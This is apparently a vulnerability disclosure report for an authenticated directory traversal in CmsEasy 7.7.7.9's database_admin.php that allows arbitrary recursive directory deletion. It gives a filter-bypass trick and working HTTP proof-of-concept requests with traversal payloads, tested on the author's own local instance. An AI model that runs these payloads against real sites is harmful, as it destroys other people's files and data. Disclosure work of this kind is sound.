# CmsEasy -v7.7.7.9 has a directory traversal vulnerability.



**Note: This reproduction requires logging into the admin panel first.**



# Vendor Information



**Developer:** 四平市九州易通科技有限公司 ( Siping Jiuzhou Yitong Technology Co., Ltd. )

**Product Information:** CmsEasy V7.7.7.9 (20240105)

**Official Website:** https://www.cmseasy.cn/

**Product Source Code Download:**
https://ftp.cmseasy.cn/CmsEasy7.x/CmsEasy_7.7.7_UTF-8_20240105.zip



# Introduce



**Note: This reproduction requires logging into the admin panel first.**

CmsEasy has a directory traversal vulnerability in `lib/admin/database_admin.php` that allows arbitrary file deletion. Attackers can exploit this vulnerability to traverse directories and delete arbitrary files.



# Analyze



Locate the file  `lib/admin/database_admin.php` , which contains the function `deletedir_action`.

**Note:** In this project, `front::get` is equivalent to `$_GET`.

**Objective:** Pass in a `payload` to bypass `check_url`, match the route to enter the `databack_` branch, and execute `front::remove($dir);`

```php
function deletedir_action() {
    
        //$dir=service::unlockString(front::get('db_dir'));
        $dir=check_url(front::get('db_dir'));
        if(strpos($dir,'backup_') !== false){
            $dir=ROOT.'/data/backup-website/'.$dir;

            @unlink($dir);
            apps::deleteossimg('backup-website/'.$dir);//插件删除

        }else  if(strpos($dir,'databack_') !== false){
            $dir=ROOT.'/data/backup-data/'.$dir;
            front::remove($dir);
            apps::deleteossimg('backup-data/'.$dir);//插件删除
        }else  if(strpos($dir,'upload_') !== false){
            $dir=ROOT.'/data/backup-upload/'.$dir;
            @unlink($dir);
            apps::deleteossimg('backup-upload/'.$dir);//插件删除
        }else  if(strpos($dir,'template_') !== false){
            $dir=ROOT.'/data/backup-template/'.$dir;
            @unlink($dir);
            apps::deleteossimg('backup-template/'.$dir);//插件删除
        }
        $count_num=isset(front::$post['select'])?count(front::post('select')):0;
        front::flash(lang_admin('success').lang_admin('delete').$count_num.$dir.lang_admin('individual').lang_admin('archives').'！');
        front::redirect(url::create('database/baker'));
    }
```



## `check_url` Bypass

```php
//判断文件路径不能带有相对路径
function check_url($tpl){
    $tpl = str_replace('#', '', $tpl);
    $tpl = str_replace('../', '', $tpl);
    $tpl = str_replace('..\\', '', $tpl);
    $tpl = str_replace('./', '', $tpl);
    $tpl = str_replace('.\\', '', $tpl);
    return $tpl;
}
```

**There are two bypass methods:**

**1.** Using conventional path parsing + overwrite.

```
.....///.....///
==> It can be achieved as follows:
../../
```

**2.** Using Windows path parsing characteristics + overwrite.

```
.....\\\\\\\\ (In the code, escaping is required. The actual result is 8/2 = 4 backslashes meaning echo outputs .....\\\\)
==>
..\\..\\  (which is also escaped and finally parsed as ..\)

Of course, another construction like .....\\\\\\ (6/2 = 3 backslashes, resulting in .....\\\) passes through check_url and resolves to ..\
```



## Entering the `databack_` Branch

to satisfy the condition:

```php
if(strpos($dir, 'databack_') !== false)
```

A database backup needs to be performed as a prerequisite operation.

**Log in to the backend.**

![image-20250129214334168](/assest/cmseasy/cmseasy-2.1.png)

The corresponding method is the `baker_action()` function in the `lib/admin/database_admin.php` file.

The implementation details are omitted, but the result is the creation of a directory with the structure:
`databack_日期xxxx` (e.g., `databack_20240129`) along with the corresponding SQL backup files.

![image-20250129214450087](/assest/cmseasy/cmseasy-2.2.png)

This directory name perfectly meets the condition for entering the `databack_` branch.

(Through testing, other `else` branches can trigger directory traversal by constructing cache directories. However, this branch is the simplest to exploit.)



## remove

To understand how the vulnerability is triggered, we need to trace the `remove` function.

```php
static function remove($dirname)
    {
        if (is_dir($dirname)) {
            $dir = new RecursiveDirectoryIterator($dirname);
            foreach ($dir as $k => $v) {
                if (!$dir->isDot()) {
                    if ($v->isDir()) {
                        self::remove($v->getPathname());
                    } else {
                        unlink($v->getPathname());
                    }
                }
            }
            unset($dir);
            rmdir($dirname);
            return true;
        }
        return false;
    }
```

**Functionality of `remove`:**  It recursively deletes the specified directory and all its contents, including subdirectories and files.



## Request Construction

Due to partial source code obfuscation, testing has revealed the following:

Request Analysis:

```http
http://127.0.0.1:5678/index.php?case=database&act=backAll&admin_dir=admin&site=default
```

The `case` parameter corresponds to the business logic file located in the `lib/admin` directory (`xxxx_admin.php`).
(In this example, it is `database_admin.php`.)

The `act` parameter corresponds to the `xxxx_action` function within the file specified by `case`.
(In this example, it is the `backAll_action()` method.)

The `admin_dir` parameter points to the backend directory.
(This vulnerability requires backend access.)

The `site` parameter is the default parameter when not explicitly configured.



Therefore, based on this, we can construct the request where `{xxxx}` represents the injection point.

```http
http://127.0.0.1:5678/index.php?case=database&act=deletedir&admin_dir=admin&site=default&db_dir={xxxx}
```



## **POC Construction and Verification**

```php
if(strpos($dir,'databack_') !== false){
            $dir=ROOT.'/data/backup-data/'.$dir;
            front::remove($dir);
            apps::deleteossimg('backup-data/'.$dir);//插件删除
        }
```

In the branch, `$dir=ROOT.'/data/backup-data/'.$dir;`

To avoid damaging the website environment, we create a directory at the same level as `data/backup-data` (which can include substructures) for testing. The following test case uses the directory `111`.

![image-20250129215150855](/assest/cmseasy/cmseasy-2.3.png)



**Constructing the Payload**

```http
GET /index.php?case=database&act=deletedir&admin_dir=admin&site=default&db_dir=databack_2025-01-27-17-17-YTRiYz_7779/.....///.....///11 HTTP/1.1
Host: 192.168.5.6:5678
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=fd4dgj9s9ib24l6jil8uakhijd; login_username=admin; login_password=mvgoWX7V4jltNikmT1BjPZKXQx9tSvwsPkbh9wCe8iBaZ2ab18391e6e61e99aff8e10d05e4ad02
Connection: keep-alive

```

**302 is a normal response**

![image-20250129215303979](/assest/cmseasy/cmseasy-2.4.png)

Checked the `data/backup-data` sibling directory `11` and its substructures, found that they were successfully deleted.

![image-20250129215331402](/assest/cmseasy/cmseasy-2.5.png)

To avoid errors and continue verification, create a directory `111` at the same level as `data` (i.e., a subdirectory directly under the website root) which may include substructures.

![image-20250129215414428](/assest/cmseasy/cmseasy-2.6.png)

**Constructing the Payload**

```http
GET /index.php?case=database&act=deletedir&admin_dir=admin&site=default&db_dir=databack_2025-01-27-17-17-YTRiYz_7779/.....///.....///.....///111 HTTP/1.1
Host: 192.168.5.6:5678
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=fd4dgj9s9ib24l6jil8uakhijd; login_username=admin; login_password=mvgoWX7V4jltNikmT1BjPZKXQx9tSvwsPkbh9wCe8iBaZ2ab18391e6e61e99aff8e10d05e4ad02
Connection: keep-alive


```

![image-20250129215449390](/assest/cmseasy/cmseasy-2.7.png)

**Checked the `data` sibling directory `111` and its substructures, found that they were successfully deleted.**

![image-20250129215507484](/assest/cmseasy/cmseasy-2.8.png)



**Vulnerability verification successful.**
